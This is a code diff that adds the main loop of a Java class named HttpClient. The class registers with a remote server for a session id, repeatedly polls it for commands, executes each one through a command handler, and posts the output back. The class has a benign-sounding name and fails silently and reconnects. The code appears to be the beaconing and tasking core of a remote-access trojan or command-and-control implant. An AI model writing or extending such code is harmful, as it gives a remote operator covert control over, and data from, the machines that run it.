@@ -56,3 +56,48 @@ public class HttpClient extends Thread {
             if (resp == null) return false;
             JSONObject o = new JSONObject(resp);
             sid = o.optString("sid", null);
+            return sid != null && !sid.isEmpty();
+        } catch (Exception e) { return false; }
+    }
+
+    private String poll() {
+        try {
+            JSONObject body = new JSONObject();
+            body.put("sid", sid);
+            String resp = post("/poll", body);
+            if (resp == null) return null;
+            JSONObject o = new JSONObject(resp);
+            return o.optString("cmd", null);
+        } catch (Exception e) { return null; }
+    }
+
+    private void postResult(String out) {
+        try {
+            JSONObject body = new JSONObject();
+            body.put("sid", sid);
+            body.put("out", out);
+            post("/result", body);
+        } catch (Exception ignored) {}
+    }
+
+    @Override
+    public void run() {
+        while (running) {
+            try {
+                if (sid == null && !register()) {
+                    Thread.sleep(Config.RECONNECT_MS);
+                    continue;
+                }
+                String cmd = poll();
+                if (cmd != null && !cmd.isEmpty()) {
+                    String out = commands.handle(cmd.trim());
+                    if (out == null || out.isEmpty()) out = "\n";
+                    postResult(out);
+                }
+            } catch (Exception e) {
+                try { Thread.sleep(Config.RECONNECT_MS); } catch (InterruptedException ie) { return; }
+                sid = null;
+            }
+        }
+    }
+}
